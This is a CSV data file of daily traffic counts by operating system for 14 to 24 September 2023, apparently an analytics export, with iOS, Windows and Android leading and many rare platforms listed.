2023-09-24,Nintendo WiiU,1
2023-09-24,PalmOS,1
2023-09-24,Playstation 3,1
2023-09-24,Playstation Vita,1
2023-09-24,macOS X,1
2023-09-23,iOS,13152739
2023-09-23,Android,7048416
2023-09-23,Windows,5411850
2023-09-23,Macintosh,2613158
2023-09-23,Linux,787699
2023-09-23,Chrome OS,293968
2023-09-23,(not set),18746
2023-09-23,Tizen,1252
2023-09-23,OS/2,793
2023-09-23,Fuchsia,614
2023-09-23,Playstation 4,530
2023-09-23,Firefox OS,497
2023-09-23,UNIX,235
2023-09-23,FreeBSD,165
2023-09-23,BlackBerry,100
2023-09-23,Windows Phone,94
2023-09-23,OpenBSD,67
2023-09-23,Xbox,44
2023-09-23,SunOS,36
2023-09-23,SymbianOS,20
2023-09-23,NetBSD,17
2023-09-23,Nintendo Wii,17
2023-09-23,Mac OS,7
2023-09-23,WebTV,5
2023-09-23,Samsung,3
2023-09-23,Solaris,3
2023-09-23,BeOS,2
2023-09-23,Nokia,2
2023-09-23,PalmOS,2
2023-09-23,Sony,2
2023-09-23,AIX,1
2023-09-23,LG,1
2023-09-23,macOS X,1
2023-09-22,iOS,15447673
2023-09-22,Windows,11911871
2023-09-22,Android,8028731
2023-09-22,Macintosh,3819165
2023-09-22,Chrome OS,866885
2023-09-22,Linux,813623
2023-09-22,(not set),28874
2023-09-22,Tizen,1243
2023-09-22,OS/2,778
2023-09-22,Fuchsia,598
2023-09-22,Firefox OS,516
2023-09-22,Playstation 4,478
2023-09-22,UNIX,271
2023-09-22,FreeBSD,180
2023-09-22,BlackBerry,101
2023-09-22,Windows Phone,85
2023-09-22,OpenBSD,60
2023-09-22,SunOS,32
2023-09-22,Xbox,28
2023-09-22,SymbianOS,22
2023-09-22,NetBSD,18
2023-09-22,WebTV,12
2023-09-22,Samsung,11
2023-09-22,Solaris,11
2023-09-22,Nintendo Wii,10
2023-09-22,Sony,10
2023-09-22,Nokia,5
2023-09-22,BeOS,4
2023-09-22,PalmOS,3
2023-09-22,Mac OS,2
2023-09-22,NTT DoCoMo,2
2023-09-22,Playstation Vita,2
2023-09-22,LG,1
2023-09-22,Playstation 3,1
2023-09-21,iOS,16604115
2023-09-21,Windows,14110516
2023-09-21,Android,8740540
2023-09-21,Macintosh,4284691
2023-09-21,Chrome OS,1052084
2023-09-21,Linux,832419
2023-09-21,(not set),43262
2023-09-21,Tizen,1268
2023-09-21,OS/2,791
2023-09-21,Fuchsia,620
2023-09-21,Firefox OS,489
2023-09-21,Playstation 4,411
2023-09-21,UNIX,313
2023-09-21,FreeBSD,174
2023-09-21,BlackBerry,131
2023-09-21,Windows Phone,74
2023-09-21,OpenBSD,47
2023-09-21,SunOS,35
2023-09-21,Xbox,26
2023-09-21,SymbianOS,18
2023-09-21,Nintendo Wii,17
2023-09-21,NetBSD,11
2023-09-21,WebTV,6
2023-09-21,Samsung,5
2023-09-21,BeOS,4
2023-09-21,Mac OS,4
2023-09-21,Nokia,3
2023-09-21,Playstation Vita,3
2023-09-21,Solaris,3
2023-09-21,PalmOS,2
2023-09-21,Sony,2
2023-09-21,NTT DoCoMo,1
2023-09-21,Playstation 3,1
2023-09-21,Unknown,1
2023-09-20,iOS,16526793
2023-09-20,Windows,13829555
2023-09-20,Android,8748764
2023-09-20,Macintosh,4416665
2023-09-20,Chrome OS,1014182
2023-09-20,Linux,898736
2023-09-20,(not set),50973
2023-09-20,Tizen,1197
2023-09-20,OS/2,739
2023-09-20,Fuchsia,626
2023-09-20,Firefox OS,430
2023-09-20,Playstation 4,395
2023-09-20,UNIX,251
2023-09-20,FreeBSD,178
2023-09-20,BlackBerry,117
2023-09-20,Windows Phone,88
2023-09-20,OpenBSD,44
2023-09-20,SunOS,35
2023-09-20,NetBSD,31
2023-09-20,Xbox,29
2023-09-20,SymbianOS,19
2023-09-20,Nintendo Wii,9
2023-09-20,Mac OS,8
2023-09-20,Samsung,7
2023-09-20,Solaris,6
2023-09-20,Sony,5
2023-09-20,BeOS,3
2023-09-20,Nokia,3
2023-09-20,PalmOS,3
2023-09-20,Playstation Vita,3
2023-09-20,DingOS,1
2023-09-20,LG,1
2023-09-20,MOT,1
2023-09-20,macOS X,1
2023-09-19,iOS,14750295
2023-09-19,Windows,13774117
2023-09-19,Android,7938817
2023-09-19,Macintosh,4304125
2023-09-19,Chrome OS,1010521
2023-09-19,Linux,867853
2023-09-19,(not set),22514
2023-09-19,Tizen,1195
2023-09-19,OS/2,705
2023-09-19,Fuchsia,632
2023-09-19,Firefox OS,417
2023-09-19,Playstation 4,407
2023-09-19,UNIX,197
2023-09-19,FreeBSD,128
2023-09-19,Windows Phone,108
2023-09-19,BlackBerry,107
2023-09-19,OpenBSD,66
2023-09-19,SunOS,34
2023-09-19,Xbox,21
2023-09-19,NetBSD,15
2023-09-19,Mac OS,11
2023-09-19,SymbianOS,11
2023-09-19,Nintendo Wii,10
2023-09-19,Samsung,7
2023-09-19,WebTV,7
2023-09-19,Sony,6
2023-09-19,Solaris,5
2023-09-19,Unknown,5
2023-09-19,Nokia,2
2023-09-19,PalmOS,2
2023-09-19,Playstation Vita,2
2023-09-19,MOT,1
2023-09-19,Playstation 3,1
2023-09-19,macOS X,1
2023-09-18,iOS,15136537
2023-09-18,Windows,13662112
2023-09-18,Android,7951296
2023-09-18,Macintosh,4382781
2023-09-18,Chrome OS,965529
2023-09-18,Linux,804377
2023-09-18,(not set),19852
2023-09-18,Tizen,1135
2023-09-18,OS/2,686
2023-09-18,Fuchsia,470
2023-09-18,Playstation 4,407
2023-09-18,Firefox OS,404
2023-09-18,UNIX,238
2023-09-18,FreeBSD,126
2023-09-18,BlackBerry,113
2023-09-18,OpenBSD,74
2023-09-18,Windows Phone,73
2023-09-18,SunOS,33
2023-09-18,Nintendo Wii,24
2023-09-18,SymbianOS,24
2023-09-18,Xbox,24
2023-09-18,Mac OS,23
2023-09-18,NetBSD,15
2023-09-18,Playstation Vita,6
2023-09-18,Sony,6
2023-09-18,macOS X,6
2023-09-18,Samsung,4
2023-09-18,Unknown,4
2023-09-18,BeOS,2
2023-09-18,Solaris,2
2023-09-18,WebTV,2
2023-09-18,DingOS,1
2023-09-18,Nintendo WiiU,1
2023-09-18,Nokia,1
2023-09-17,iOS,10607138
2023-09-17,Android,5868093
2023-09-17,Windows,5068621
2023-09-17,Macintosh,2590029
2023-09-17,Linux,680710
2023-09-17,Chrome OS,333184
2023-09-17,(not set),16393
2023-09-17,Tizen,1090
2023-09-17,OS/2,606
2023-09-17,Fuchsia,489
2023-09-17,Firefox OS,392
2023-09-17,Playstation 4,364
2023-09-17,UNIX,163
2023-09-17,FreeBSD,134
2023-09-17,BlackBerry,96
2023-09-17,Windows Phone,81
2023-09-17,Xbox,38
2023-09-17,OpenBSD,31
2023-09-17,SymbianOS,25
2023-09-17,SunOS,18
2023-09-17,NetBSD,12
2023-09-17,Nintendo Wii,10
2023-09-17,Mac OS,9
2023-09-17,Sony,8
2023-09-17,Unknown,6
2023-09-17,Samsung,5
2023-09-17,BeOS,4
2023-09-17,Nokia,3
2023-09-17,WebTV,2
2023-09-17,LG,1
2023-09-17,MOT,1
2023-09-17,PalmOS,1
2023-09-17,openSUSE,1
2023-09-16,iOS,12199372
2023-09-16,Android,6786841
2023-09-16,Windows,4864164
2023-09-16,Macintosh,2482838
2023-09-16,Linux,800329
2023-09-16,Chrome OS,275240
2023-09-16,(not set),21622
2023-09-16,Tizen,1156
2023-09-16,OS/2,678
2023-09-16,Fuchsia,508
2023-09-16,Firefox OS,415
2023-09-16,Playstation 4,371
2023-09-16,UNIX,176
2023-09-16,FreeBSD,122
2023-09-16,BlackBerry,119
2023-09-16,Windows Phone,70
2023-09-16,OpenBSD,58
2023-09-16,Xbox,32
2023-09-16,SunOS,17
2023-09-16,SymbianOS,15
2023-09-16,Mac OS,13
2023-09-16,NetBSD,13
2023-09-16,Nintendo Wii,13
2023-09-16,Samsung,8
2023-09-16,Sony,8
2023-09-16,Unknown,6
2023-09-16,BeOS,2
2023-09-16,Nokia,2
2023-09-16,IRIX,1
2023-09-16,LG,1
2023-09-16,MOT,1
2023-09-16,PalmOS,1
2023-09-16,Playstation Vita,1
2023-09-16,macOS X,1
2023-09-15,iOS,14813700
2023-09-15,Windows,12082243
2023-09-15,Android,7894361
2023-09-15,Macintosh,3672041
2023-09-15,Chrome OS,852515
2023-09-15,Linux,836042
2023-09-15,(not set),20201
2023-09-15,Tizen,1174
2023-09-15,OS/2,684
2023-09-15,Fuchsia,499
2023-09-15,Firefox OS,435
2023-09-15,Playstation 4,383
2023-09-15,UNIX,198
2023-09-15,FreeBSD,170
2023-09-15,BlackBerry,115
2023-09-15,Windows Phone,81
2023-09-15,OpenBSD,50
2023-09-15,notWindows,34
2023-09-15,Xbox,31
2023-09-15,SymbianOS,25
2023-09-15,SunOS,19
2023-09-15,Mac OS,18
2023-09-15,Nintendo Wii,18
2023-09-15,Sony,15
2023-09-15,NetBSD,12
2023-09-15,Unknown,8
2023-09-15,Samsung,6
2023-09-15,WebTV,6
2023-09-15,PalmOS,5
2023-09-15,Playstation Vita,5
2023-09-15,LG,3
2023-09-15,Nokia,3
2023-09-15,BeOS,1
2023-09-15,IRIX,1
2023-09-15,MOT,1
2023-09-15,Solaris,1
2023-09-15,macOS X,1
2023-09-14,iOS,15496713
2023-09-14,Windows,13860022
2023-09-14,Android,7870373
2023-09-14,Macintosh,4258677
2023-09-14,Chrome OS,973827
2023-09-14,Linux,875547
2023-09-14,(not set),19144
2023-09-14,Tizen,1268
2023-09-14,OS/2,728
2023-09-14,Fuchsia,537
2023-09-14,Firefox OS,454
2023-09-14,Playstation 4,397
2023-09-14,UNIX,244
2023-09-14,BlackBerry,158
2023-09-14,FreeBSD,143
2023-09-14,Windows Phone,87
2023-09-14,OpenBSD,58
2023-09-14,SymbianOS,42
2023-09-14,Xbox,26
2023-09-14,NetBSD,23
2023-09-14,Sony,22
2023-09-14,Mac OS,19
2023-09-14,Nintendo Wii,19
2023-09-14,SunOS,17
2023-09-14,Unknown,14
2023-09-14,Samsung,13
2023-09-14,Nokia,7
2023-09-14,PalmOS,7
2023-09-14,Playstation Vita,6
2023-09-14,WebTV,5
2023-09-14,macOS X,3
2023-09-14,IRIX,2
2023-09-14,NTT DoCoMo,2
2023-09-14,Playstation Portable,2
2023-09-14,Vodafone,2
2023-09-14,LG,1
2023-09-14,Nintendo WiiU,1
2023-09-14,Playstation 3,1